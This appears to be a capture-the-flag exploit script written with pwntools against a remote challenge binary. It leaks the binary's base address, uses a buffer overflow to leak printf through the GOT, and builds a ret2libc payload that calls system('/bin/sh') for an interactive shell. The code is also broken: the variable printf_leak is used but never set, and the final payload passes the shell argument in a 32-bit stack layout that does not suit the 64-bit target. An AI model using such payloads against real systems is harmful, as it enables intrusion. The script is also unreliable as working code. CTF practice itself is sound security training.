#!/Users/vinnie/CTF/venv/bin/python3
from pwn import log, remote, ELF, p64, context

context.log_level = "debug"

def recvmenu():
    for i in range(8):
        print(conn.recvline())

conn = remote('playground.tcp1p.team', 19001)
elf = context.binary = ELF('./chall', checksec=False)
libc = ELF('./libc.so.6')
offset = 40

recvmenu()

print("SENDING [[2]]")
conn.sendline(b'2')

print(conn.recvuntil(b'ketik 1 dulu kalau mau ehe\n'))

print("SENDING [[1]]")
conn.sendline(b'1')
# Get the treasure
conn.recvuntil(b'untukmuu, ')
main_leak = int(conn.recvline().strip(), 16)
binary_base = main_leak - elf.symbols['main']

log.success(f"LEAKED MAIN [[{hex(main_leak)}]]")
log.success(f"BASE [[{hex(binary_base)}]]")

recvmenu()

printf_got = binary_base + elf.got['printf']
payload = b'A' * 40 + p64(printf_got)

print("SENDING [[3]]")
conn.sendline(b'3')
conn.sendlineafter(': ', payload)
conn.recvline()

log.success(f"Leaked printf: {hex(printf_leak)}")

# Step 3: Compute system() and "/bin/sh" addresses
libc_base = printf_leak - libc.symbols['printf']
system_addr = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh\x00'))

log.success(f"Libc base: {hex(libc_base)}")
log.success(f"System: {hex(system_addr)}")
log.success(f"/bin/sh: {hex(bin_sh_addr)}")

# Step 4: Exploit buffer overflow to call system("/bin/sh")
payload = b'A' * 40
payload += p64(system_addr)  # Overwrite return address
payload += p64(0)  # Return address after system() (unused)
payload += p64(bin_sh_addr)  # "/bin/sh" as system() argument

conn.sendlineafter('>', '3')  # Enter vuln() again
conn.sendlineafter(': ', payload)

conn.interactive()  # Get shell

conn.close()
